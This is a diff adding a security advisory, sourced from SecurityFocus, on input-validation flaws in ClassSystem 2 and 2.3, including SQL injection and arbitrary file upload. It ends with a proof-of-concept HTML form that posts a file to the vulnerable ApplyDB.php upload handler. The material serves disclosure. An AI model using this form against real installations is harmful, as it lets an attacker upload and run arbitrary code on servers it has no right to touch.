@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/29372/info
+   
+ClassSystem is prone to multiple input-validation vulnerabilities because it fails to sufficiently sanitize user-supplied data. These issues include multiple SQL-injection vulnerabilities and an arbitrary-file-upload vulnerability.
+   
+Exploiting these issues could allow an attacker to compromise the application, execute arbitrary code, access or modify data, or exploit latent vulnerabilities in the underlying database.
+   
+ClassSystem 2 and 2.3 are affected; other versions may also be vulnerable. 
+
+<form enctype="multipart/form-data" action="http://www.example.com/class/ApplyDB.php" method="post">
+ <input type="hidden" name="teacher_account" value="blah1">
+ <input type="hidden" name="teacher_password" value="blah1">
+ <input type="file" name="uploadfile" size="40"><br>
+ <input type="submit" value="send">
+</form>
